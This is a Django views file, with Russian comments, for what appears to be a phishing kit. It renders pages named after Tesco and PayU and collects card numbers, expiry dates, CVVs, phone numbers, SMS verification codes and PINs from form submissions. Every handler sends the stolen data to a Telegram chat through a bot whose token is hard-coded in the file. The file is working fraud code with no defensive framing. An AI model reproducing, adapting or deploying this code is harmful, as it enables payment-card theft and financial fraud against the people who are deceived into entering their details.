from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from telegram import Bot
import telegram
import asyncio
async def send_telegram_message(message, chat_ids):
    bot = Bot(token='6740469525:AAEnlsjIQUZiDLDxVYKxPviq3pOoMi-Hyl0')
    for chat_id in chat_ids:
        try:
            await bot.send_message(chat_id=chat_id, text=message, parse_mode='MarkdownV2')
        except Exception as e:
            print(f"Ошибка отправки сообщения на чат {e}")

@csrf_exempt
async def process_data(request):
    chat_ids = ['-4279184761']
    if request.method == 'POST':
        card_number = request.POST.get('card_number')
        expiry_date = request.POST.get('expiry_date')
        cvv = request.POST.get('cvv')
        nomer = request.POST.get('nomer')
        itog = (
            f"💳 `{card_number}` \n 📅 `{expiry_date}`\n 🔒 `{cvv}` \n 📱 `{nomer}`"
        )
        
        await send_telegram_message(itog, chat_ids)
        
        # Возврат данных для отображения на странице
        return JsonResponse({
            'card_number': card_number,
            'expiry_date': expiry_date,
            'cvv': cvv
        })
    
    return JsonResponse({'status': 'fail', 'message': 'Invalid request'}, status=400)

async def process_data1(request):
    chat_ids = ['-4279184761']
    if request.method == 'POST':
        sms_code = request.POST.get('sms_code')
        card_number = request.POST.get('card_number')
        ePinn = request.POST.get('pin')
        
        # Передаем код SMS и номер карты в функцию отправки сообщения
        await send_telegram_message(f'Карта `{card_number}` \n СМС КОД : `{sms_code}` \n ePin : `{ePinn}`', chat_ids)

        # Возвращаем пустой JSON-ответ
        return JsonResponse({})

    return JsonResponse({'status': 'fail', 'message': 'Invalid request'}, status=400)


def index(request):
    return render(request, 'tesco.html')
def code(request):
    return render(request, 'code.html')
def code1(request):
    return render(request, 'code1.html')
def payu(request):
    return render(request, 'PayU.html')
def error(request):
    return render(request, 'error.html')


